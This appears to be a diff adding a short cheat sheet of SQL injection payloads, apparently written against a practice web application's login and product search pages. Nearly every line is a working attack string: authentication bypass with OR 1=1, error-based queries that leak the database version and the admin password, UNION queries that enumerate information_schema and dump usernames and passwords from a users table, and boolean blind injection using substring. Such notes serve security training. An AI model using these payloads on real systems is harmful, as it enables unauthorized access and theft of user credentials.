@@ -1,0 +1,28 @@
+Login bypass attack on login1.php page
+
+non-existent-user' OR 1=1 -- //
+' OR 1=1 -- //
+
+
+
+Verbose SQL Error based Injection on login1 page
+
+' or 1 in (select @@version) -- //
+' or 1 in (select password from users where username = 'admin') -- //
+
+
+Extracting data using UNION queries on Search products page
+
+' order by 5 -- //
+' union select 1,2,3,4,5 -- //
+' union select null, null, database(), user(), @@version -- //
+' union select null, table_name, column_name, table_schema, null from information_schema.columns -- //
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+' union select null, id, username, password, fname from users -- //
+
+
+Blind SQL injection  appriciations is blindSQLI
+
+
+?user=1' and 1=1 -- //
+?user=admin' and substring((select table_name from information_schema.columns where column_name = 'password' LIMIT 1),1,1)>'a' -- //
